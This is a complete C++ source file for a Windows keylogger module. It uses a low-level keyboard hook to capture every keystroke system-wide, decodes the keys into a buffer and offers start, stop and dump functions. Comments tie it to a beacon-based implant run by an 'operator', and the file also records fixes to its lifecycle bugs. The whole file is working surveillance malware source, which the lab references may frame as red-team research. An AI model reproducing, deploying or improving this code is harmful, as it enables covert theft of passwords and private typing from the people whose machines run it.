// keylog.cpp — Low-level keyboard hook (WH_KEYBOARD_LL).
// The hook runs on a dedicated thread that owns a message pump.
// Keystrokes go into a circular wstring buffer (capped at 64K chars).
// Thread-safe: all shared state protected by g_mtx.

#include "keylog.hpp"
#include <atomic>
#include <mutex>
#include <thread>
#include <string>

static HHOOK              g_hook   = NULL;
static std::wstring       g_buf;
static std::mutex         g_mtx;
static std::atomic<bool>  g_active{false};
static std::thread        g_thread;
static DWORD              g_tid    = 0;      // thread id — used to post WM_QUIT on stop
static std::mutex         g_lifeMtx;         // serialises start/stop against each other
static HANDLE             g_ready  = nullptr; // manual-reset: hook thread attempted install
static HANDLE             g_stopped = nullptr; // manual-reset: hook thread finished teardown

// ─── Hook callback ────────────────────────────────────────────────────────────
// Runs on the hook thread. WH_KEYBOARD_LL fires for all physical keyboard input
// regardless of which window has focus — no desktop injection needed.
static LRESULT CALLBACK KeyProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        auto* ks = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        wchar_t ch[8] = {};
        BYTE state[256] = {};
        GetKeyboardState(state);
        // ToUnicode returns the unicode char(s); handles dead keys, shift, etc.
        int r = ToUnicode(ks->vkCode, ks->scanCode, state, ch, 7, 0);

        std::lock_guard<std::mutex> lk(g_mtx);
        if (r > 0) {
            g_buf.append(ch, r);
        } else {
            // Map common VKs to readable tokens
            switch (ks->vkCode) {
                case VK_RETURN:  g_buf += L'\n';     break;
                case VK_BACK:    g_buf += L"[BS]";   break;
                case VK_TAB:     g_buf += L'\t';     break;
                case VK_ESCAPE:  g_buf += L"[ESC]";  break;
                case VK_DELETE:  g_buf += L"[DEL]";  break;
                case VK_UP:      g_buf += L"[UP]";   break;
                case VK_DOWN:    g_buf += L"[DN]";   break;
                case VK_LEFT:    g_buf += L"[LT]";   break;
                case VK_RIGHT:   g_buf += L"[RT]";   break;
                case VK_HOME:    g_buf += L"[HM]";   break;
                case VK_END:     g_buf += L"[END]";  break;
                case VK_PRIOR:   g_buf += L"[PGU]";  break;
                case VK_NEXT:    g_buf += L"[PGD]";  break;
                case VK_CAPITAL: g_buf += L"[CAP]";  break;
                // Ignore bare modifiers
                case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT:   break;
                case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: break;
                case VK_MENU:  case VK_LMENU:  case VK_RMENU:    break;
                case VK_LWIN:  case VK_RWIN:                      break;
                default: {
                    wchar_t tmp[10];
                    swprintf_s(tmp, L"[%02X]", ks->vkCode);
                    g_buf += tmp;
                }
            }
        }
        // Rolling cap — drop oldest half when over limit
        if (g_buf.size() > 65536) g_buf.erase(0, 32768);
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// ─── API ─────────────────────────────────────────────────────────────────────
// Lifecycle notes (these were all real defects, not style):
//   * The old start path checked g_active, then created the thread with no
//     lock. Two callers could both pass the check; the second assignment to
//     g_thread destroyed a still-joinable std::thread, which is std::terminate
//     — the whole process died, not just the keylogger.
//   * The old start path slept 200ms and hoped the hook thread had set g_tid.
//     On a busy lab VM it had not, so KeylogStop posted WM_QUIT to thread id 0,
//     the pump never exited, and the hook stayed installed for the process
//     lifetime while the operator was told collection had stopped.
//   * KeylogStop returned without any confirmation of teardown, so lab cleanup
//     could not be trusted to have taken effect.
void KeylogStart() {
    std::lock_guard<std::mutex> lk(g_lifeMtx);
    if (g_active.load()) return;

    if (!g_ready)   g_ready   = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (!g_stopped) g_stopped = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (!g_ready || !g_stopped) {
        if (g_ready)   { CloseHandle(g_ready);   g_ready   = nullptr; }
        if (g_stopped) { CloseHandle(g_stopped); g_stopped = nullptr; }
        return;
    }
    ResetEvent(g_ready);
    ResetEvent(g_stopped);

    // Reap a previous run instead of overwriting a joinable thread object.
    if (g_thread.joinable()) g_thread.join();

    g_active = true;
    g_thread = std::thread([]() {
        g_tid  = GetCurrentThreadId();
        g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyProc, NULL, 0);
        if (!g_hook) {
            g_active = false;
            SetEvent(g_ready);
            return;
        }
        SetEvent(g_ready);

        // The message pump is required — WH_KEYBOARD_LL callbacks are dispatched
        // through the message queue of the thread that installed the hook.
        MSG msg;
        while (g_active.load()) {
            // MsgWaitForMultipleObjectsEx with 0-handle set gives a 50ms timeout
            // so we can check g_active without blocking forever on GetMessage.
            DWORD r = MsgWaitForMultipleObjectsEx(0, nullptr, 50, QS_ALLINPUT,
                                                   MWMO_INPUTAVAILABLE);
            if (r == WAIT_OBJECT_0) {
                while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
                    if (msg.message == WM_QUIT) { g_active = false; break; }
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
            }
        }

        UnhookWindowsHookEx(g_hook);
        g_hook = NULL;
        g_tid  = 0;
        SetEvent(g_stopped);
    });

    // Block until the hook thread reports the install outcome, so g_tid is
    // guaranteed valid by the time this returns. Bail out cleanly if it never
    // schedules at all rather than starting a keylogger we cannot stop.
    if (WaitForSingleObject(g_ready, 5000) != WAIT_OBJECT_0) {
        g_active = false;
        DWORD tid = g_tid;
        if (tid) PostThreadMessageW(tid, WM_QUIT, 0, 0);
        if (g_stopped) WaitForSingleObject(g_stopped, 5000);
        if (g_thread.joinable()) g_thread.join();
    }
}

void KeylogStop() {
    std::lock_guard<std::mutex> lk(g_lifeMtx);
    if (!g_active.load()) return;
    g_active = false;

    const DWORD tid = g_tid;
    if (tid) PostThreadMessageW(tid, WM_QUIT, 0, 0);

    // Do not wait on or join our own thread: today Stop runs on the beacon
    // thread, but a caller dispatched from the hook thread would otherwise
    // deadlock on its own teardown event.
    if (tid && tid != GetCurrentThreadId()) {
        if (g_stopped) WaitForSingleObject(g_stopped, 5000);
        if (g_thread.joinable()) g_thread.join();
    }
}

std::wstring KeylogDump() {
    std::lock_guard<std::mutex> lk(g_mtx);
    if (g_buf.empty()) return L"[keylog: empty buffer]";
    std::wstring out = std::move(g_buf);
    g_buf.clear();
    return out;
}

bool KeylogRunning() { return g_active.load(); }
